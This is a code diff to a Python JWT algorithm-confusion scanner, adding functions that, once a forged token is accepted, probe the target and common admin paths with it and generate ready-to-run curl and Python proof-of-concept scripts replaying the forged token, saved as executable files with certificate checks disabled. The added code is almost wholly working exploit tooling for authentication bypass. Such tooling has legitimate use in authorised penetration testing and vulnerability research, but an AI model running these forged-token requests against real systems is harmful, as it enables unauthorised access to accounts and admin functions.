@@ -17,6 +17,7 @@ import urllib3
 import sys
 import time
 from colorama import init, Fore, Style
+import re
 
 # Disable SSL warnings for testing purposes
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -458,6 +459,286 @@ class JWTConfusionScanner:
         # Calculate final similarity (0.0 to 1.0)
         return similarity / total_weight if total_weight > 0 else 0.0
     
+    def _generate_poc(self, vuln: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Generate a Proof of Concept for a verified vulnerability
+        
+        Args:
+            vuln: Dictionary containing vulnerability details
+                
+        Returns:
+            Dictionary with POC details
+        """
+        print(f"\n{Fore.GREEN}[+] Generating Proof of Concept for {vuln['attack_type']}{Style.RESET_ALL}")
+        
+        # Extract needed data
+        attack_type = vuln['attack_type']
+        attack_token = vuln['token']
+        description = vuln['description']
+        
+        poc_result = {
+            "attack_type": attack_type,
+            "attack_token": attack_token,
+            "description": description,
+            "evidence": [],
+            "curl_command": "",
+            "python_script": ""
+        }
+        
+        try:
+            # Get decoded details of forged token
+            forged_header, forged_payload, _ = self._decode_jwt(attack_token)
+            
+            # Define endpoints to test for privilege differences
+            test_endpoints = [self.target_url]  # Main URL
+            
+            # If we have a verification endpoint, add it
+            if self.verification_endpoint and self.verification_endpoint != self.target_url:
+                test_endpoints.append(self.verification_endpoint)
+                
+            # Also try to detect common admin/profile endpoints
+            base_url = '/'.join(self.target_url.split('/')[:3])  # Get domain portion
+            common_paths = ['/admin', '/dashboard', '/profile', '/account', '/settings', '/api/admin', '/api/v1/admin']
+            test_endpoints.extend(f"{base_url}{path}" for path in common_paths)
+            
+            # Make requests with the original token and the forged token to compare
+            original_token = self._get_original_token()
+            evidence_items = []
+            
+            # Limit to first 3 endpoints to avoid excessive requests
+            for endpoint in test_endpoints[:3]:
+                try:
+                    print(f"{Fore.BLUE}[*] Testing endpoint: {endpoint}{Style.RESET_ALL}")
+                    
+                    # Test with original token
+                    original_url = self.target_url
+                    self.target_url = endpoint
+                    original_response = self._make_request(original_token)
+                    
+                    # Test with attack token
+                    attack_response = self._make_request(attack_token)
+                    
+                    # Reset target URL
+                    self.target_url = original_url
+                    
+                    if not original_response or not attack_response:
+                        continue
+                        
+                    # Compare responses
+                    original_status = original_response.status_code
+                    attack_status = attack_response.status_code
+                    
+                    original_length = len(original_response.content)
+                    attack_length = len(attack_response.content)
+                    
+                    # Check for significant differences
+                    status_different = original_status != attack_status
+                    length_difference = abs(original_length - attack_length) > 100  # More than 100 bytes difference
+                    
+                    # Extract interesting parts of the responses
+                    original_interesting = self._extract_interesting_content(original_response.text)
+                    attack_interesting = self._extract_interesting_content(attack_response.text)
+                    
+                    content_different = original_interesting != attack_interesting
+                    
+                    if status_different or length_difference or content_different:
+                        evidence_items.append({
+                            "endpoint": endpoint,
+                            "original_status": original_status,
+                            "attack_status": attack_status,
+                            "original_length": original_length,
+                            "attack_length": attack_length,
+                            "original_sample": original_interesting[:200] + "..." if len(original_interesting) > 200 else original_interesting,
+                            "attack_sample": attack_interesting[:200] + "..." if len(attack_interesting) > 200 else attack_interesting,
+                            "differences": {
+                                "status": status_different,
+                                "length": length_difference,
+                                "content": content_different
+                            }
+                        })
+                except Exception as e:
+                    print(f"{Fore.RED}[!] Error generating POC for endpoint {endpoint}: {str(e)}{Style.RESET_ALL}")
+            
+            # Find the endpoint with the most significant differences for curl command
+            best_endpoint = self.target_url
+            if evidence_items:
+                # Prioritize endpoints with more differences
+                for item in evidence_items:
+                    if sum(1 for v in item["differences"].values() if v) >= 2:
+                        best_endpoint = item["endpoint"]
+                        break
+            
+            # Generate curl command
+            curl_cmd = self._generate_curl_poc(best_endpoint, attack_token, self.cookie_name)
+            
+            # Generate simple Python script
+            python_script = self._generate_python_poc(best_endpoint, attack_token, self.cookie_name)
+            
+            # Compile final POC
+            poc_result["evidence"] = evidence_items
+            poc_result["curl_command"] = curl_cmd
+            poc_result["python_script"] = python_script
+            poc_result["original_token_data"] = {
+                "header": self._decode_jwt(original_token)[0],
+                "payload": self._decode_jwt(original_token)[1]
+            }
+            poc_result["attack_token_data"] = {
+                "header": forged_header,
+                "payload": forged_payload
+            }
+            
+            return poc_result
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error generating POC: {str(e)}{Style.RESET_ALL}")
+            return {"error": str(e)}
+
+    def _extract_interesting_content(self, html_content: str) -> str:
+        """
+        Extract interesting parts from HTML/JSON responses
+        
+        Args:
+            html_content: HTML or JSON content
+            
+        Returns:
+            String with interesting parts
+        """
+        if not html_content:
+            return "Empty content"
+            
+        try:
+            # Check if content is JSON
+            try:
+                json_data = json.loads(html_content)
+                # Extract interesting JSON fields - using a set for faster lookups
+                interesting_keys = {
+                    'user', 'admin', 'role', 'roles', 'permissions', 'isAdmin', 
+                    'is_admin', 'authenticated', 'auth', 'account', 'profile', 
+                    'username', 'email', 'id'
+                }
+                
+                # Dictionary comprehension for better performance
+                interesting_fields = {
+                    key: json_data[key] for key in interesting_keys 
+                    if key in json_data
+                }
+                
+                # If we found interesting fields, return those
+                if interesting_fields:
+                    return json.dumps(interesting_fields)
+                # Otherwise, return compact JSON
+                return json.dumps(json_data, separators=(',', ':'))[:500]
+            except json.JSONDecodeError:
+                pass
+                
+            # Try to extract interesting HTML content
+            interesting_content = []
+            
+            # Look for title
+            title_match = re.search(r'<title>(.*?)</title>', html_content)
+            if title_match:
+                interesting_content.append(f"Title: {title_match.group(1)}")
+                
+            # Look for h1 headings
+            h1_matches = re.findall(r'<h1[^>]*>(.*?)</h1>', html_content)
+            if h1_matches:
+                interesting_content.append(f"Headings: {', '.join(h1_matches[:3])}")
+                
+            # Look for admin/dashboard elements
+            admin_pattern = r'<[^>]*class=["\'](?:[^"\']*\s)?(?:admin|dashboard|account|profile)[^"\']*["\'][^>]*>'
+            admin_matches = re.findall(admin_pattern, html_content)
+            if admin_matches:
+                interesting_content.append(f"Admin elements found: {len(admin_matches)}")
+                
+            # If we found anything interesting, return it
+            if interesting_content:
+                return '\n'.join(interesting_content)
+                
+            # Otherwise, just return a length notification
+            return f"Content length: {len(html_content)} characters"
+        except Exception as e:
+            return f"Error extracting content: {str(e)}"
+
+    def _generate_curl_poc(self, endpoint: str, token: str, cookie_name: Optional[str] = None) -> str:
+        """
+        Generate a curl command for proof of concept
+        
+        Args:
+            endpoint: Target URL endpoint
+            token: JWT token to use
+            cookie_name: Optional cookie name if token is sent via cookie
+            
+        Returns:
+            String with curl command
+        """
+        # Add secure options: -s (silent), -k (insecure), -i (include headers)
+        if cookie_name:
+            return f'curl -s -k -X GET "{endpoint}" -b "{cookie_name}={token}" -i'
+        return f'curl -s -k -X GET "{endpoint}" -H "Authorization: Bearer {token}" -i'
+
+    def _generate_python_poc(self, endpoint: str, token: str, cookie_name: Optional[str] = None) -> str:
+        """
+        Generate a Python script for proof of concept
+        
+        Args:
+            endpoint: Target URL endpoint
+            token: JWT token to use
+            cookie_name: Optional cookie name if token is sent via cookie
+            
+        Returns:
+            String with Python script
+        """
+        # Add error handling and better formatting to the script
+        script_template = """
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+import sys
+import json
+from typing import Dict, Any
+
+# Suppress only the single InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+url = "{endpoint}"
+{auth_setup}
+
+def print_formatted_json(data: Dict[str, Any]) -> None:
+    \"\"\"Print JSON data in a formatted way\"\"\"
+    print(json.dumps(data, indent=2, sort_keys=True))
+
+try:
+    response = requests.get(url, {auth_param}, verify=False, timeout=10)
+    print(f"Status Code: {{response.status_code}}")
+    print("\\nHeaders:")
+    for key, value in response.headers.items():
+        print(f"{{key}}: {{value}}")
+    
+    print("\\nResponse Body:")
+    try:
+        # Try to parse as JSON for prettier output
+        json_data = response.json()
+        print_formatted_json(json_data)
+    except ValueError:
+        # Not JSON, print as text
+        print(response.text)
+        
+except requests.exceptions.RequestException as e:
+    print(f"Error: {{e}}", file=sys.stderr)
+    sys.exit(1)
+"""
+        if cookie_name:
+            auth_setup = f'cookies = {{"{cookie_name}": "{token}"}}'
+            auth_param = "cookies=cookies"
+        else:
+            auth_setup = f'headers = {{"Authorization": "Bearer {token}"}}'
+            auth_param = "headers=headers"
+            
+        return script_template.format(
+            endpoint=endpoint,
+            auth_setup=auth_setup,
+            auth_param=auth_param
+        )
+    
     def _try_attack(self, attack_type: str, token: str, description: str) -> Dict[str, Any]:
         """
         Try an attack with the modified token
@@ -532,6 +813,17 @@ class JWTConfusionScanner:
                 verified = True
                 print(f"{Fore.GREEN}[+] Auto-verified due to high confidence score.{Style.RESET_ALL}")
         
+        # Generate POC if vulnerability is verified
+        poc_data = None
+        if verified:
+            print(f"{Fore.BLUE}[*] Generating proof of concept...{Style.RESET_ALL}")
+            vuln_data = {
+                "attack_type": attack_type,
+                "token": token,
+                "description": description
+            }
+            poc_data = self._generate_poc(vuln_data)
+        
         # Determine final result
         final_result = {
             "success": initial_result["success"],
@@ -547,10 +839,17 @@ class JWTConfusionScanner:
             "details": initial_result.get("details", {})
         }
         
+        # Add POC data if available
+        if poc_data:
+            final_result["poc"] = poc_data
+        
         # Report findings
         if verified:
             print(f"{Fore.GREEN}[+] VERIFIED VULNERABILITY FOUND! Attack: {attack_type}{Style.RESET_ALL}")
             print(f"{Fore.GREEN}[+] Vulnerable token: {token}{Style.RESET_ALL}")
+            if poc_data:
+                print(f"{Fore.GREEN}[+] Proof of Concept generated{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[+] Curl command: {poc_data.get('curl_command', 'N/A')}{Style.RESET_ALL}")
         elif initial_result["success"]:
             print(f"{Fore.YELLOW}[+] POTENTIAL VULNERABILITY FOUND! Attack: {attack_type}{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}[+] Potentially vulnerable token: {token}{Style.RESET_ALL}")
@@ -937,6 +1236,9 @@ class JWTConfusionScanner:
             self._print_verbose(f"Header: {json.dumps(header, indent=2)}")
             self._print_verbose(f"Payload: {json.dumps(payload, indent=2)}")
             
+            # Establish baselines for comparison
+            self._establish_baselines(orig_token)
+            
             # Run all tests
             results = {}
             
@@ -950,14 +1252,31 @@ class JWTConfusionScanner:
             
             # Compile summary
             vulnerable = False
+            verified_vulnerabilities = []
+            pocs = []
+            
+            # Check for verified vulnerabilities and collect POCs
             for test_name, test_results in results.items():
-                if any(test_results):
-                    vulnerable = True
-                    break
+                for result in test_results:
+                    if result.get('success', False):
+                        vulnerable = True
+                        if result.get('verified', False):
+                            verified_vulnerabilities.append({
+                                'attack_type': result.get('attack_type', ''),
+                                'description': result.get('description', ''),
+                                'token': result.get('token', '')
+                            })
+                            # Collect POC if available
+                            if 'poc' in result:
+                                pocs.append(result['poc'])
             
             print("\n" + "="*60)
             if vulnerable:
                 print(f"{Fore.RED}[!] Target appears VULNERABLE to JWT algorithm confusion attacks!{Style.RESET_ALL}")
+                if verified_vulnerabilities:
+                    print(f"{Fore.RED}[!] {len(verified_vulnerabilities)} verified vulnerabilities found!{Style.RESET_ALL}")
+                    for i, vuln in enumerate(verified_vulnerabilities):
+                        print(f"{Fore.RED}[!] Vulnerability #{i+1}: {vuln['attack_type']} - {vuln['description']}{Style.RESET_ALL}")
             else:
                 print(f"{Fore.GREEN}[+] No vulnerabilities detected. Target appears to properly validate JWT tokens.{Style.RESET_ALL}")
             print("="*60)
@@ -968,7 +1287,9 @@ class JWTConfusionScanner:
                 'original_token': orig_token,
                 'header': header,
                 'payload': payload,
-                'results': results
+                'results': results,
+                'verified_vulnerabilities': verified_vulnerabilities,
+                'pocs': pocs
             }
             
         except Exception as e:
@@ -993,6 +1314,8 @@ def main():
     parser.add_argument('--failure-strings', help='Comma-separated list of strings indicating failed exploitation')
     parser.add_argument('--output', help='Output file for scan results (JSON format)')
     parser.add_argument('--verify-all', action='store_true', help='Attempt to verify all potential vulnerabilities')
+    parser.add_argument('--save-poc', action='store_true', help='Save proof of concept scripts to files')
+    parser.add_argument('--poc-dir', default='./pocs', help='Directory to save POC files (default: ./pocs)')
     
     args = parser.parse_args()
     
@@ -1026,7 +1349,58 @@ def main():
         delay=args.delay
     )
     
-    scanner.scan()
+    results = scanner.scan()
+    
+    # Save results to file if requested
+    if args.output and results.get('success', False):
+        try:
+            with open(args.output, 'w') as f:
+                json.dump(results, f, indent=2)
+            print(f"{Fore.GREEN}[+] Results saved to {args.output}{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error saving results: {str(e)}{Style.RESET_ALL}")
+    
+    # Save POCs to files if requested
+    if args.save_poc and results.get('success', False) and results.get('pocs', []):
+        import os
+        
+        # Create POC directory if it doesn't exist
+        if not os.path.exists(args.poc_dir):
+            try:
+                os.makedirs(args.poc_dir)
+                print(f"{Fore.GREEN}[+] Created POC directory: {args.poc_dir}{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error creating POC directory: {str(e)}{Style.RESET_ALL}")
+                return
+        
+        # Save each POC
+        for i, poc in enumerate(results.get('pocs', [])):
+            try:
+                # Save curl command
+                if poc.get('curl_command'):
+                    curl_file = os.path.join(args.poc_dir, f"poc_{i+1}_curl.sh")
+                    with open(curl_file, 'w') as f:
+                        f.write("#!/bin/bash\n\n")
+                        f.write("# JWT Scanner Proof of Concept\n")
+                        f.write(f"# Attack: {poc.get('attack_type', 'Unknown')}\n")
+                        f.write(f"# Description: {poc.get('description', 'No description')}\n\n")
+                        f.write(poc['curl_command'])
+                    os.chmod(curl_file, 0o755)  # Make executable
+                    print(f"{Fore.GREEN}[+] Saved curl POC to {curl_file}{Style.RESET_ALL}")
+                
+                # Save Python script
+                if poc.get('python_script'):
+                    py_file = os.path.join(args.poc_dir, f"poc_{i+1}_python.py")
+                    with open(py_file, 'w') as f:
+                        f.write("#!/usr/bin/env python3\n")
+                        f.write("# JWT Scanner Proof of Concept\n")
+                        f.write(f"# Attack: {poc.get('attack_type', 'Unknown')}\n")
+                        f.write(f"# Description: {poc.get('description', 'No description')}\n\n")
+                        f.write(poc['python_script'])
+                    os.chmod(py_file, 0o755)  # Make executable
+                    print(f"{Fore.GREEN}[+] Saved Python POC to {py_file}{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error saving POC #{i+1}: {str(e)}{Style.RESET_ALL}")
 
 
 if __name__ == "__main__":
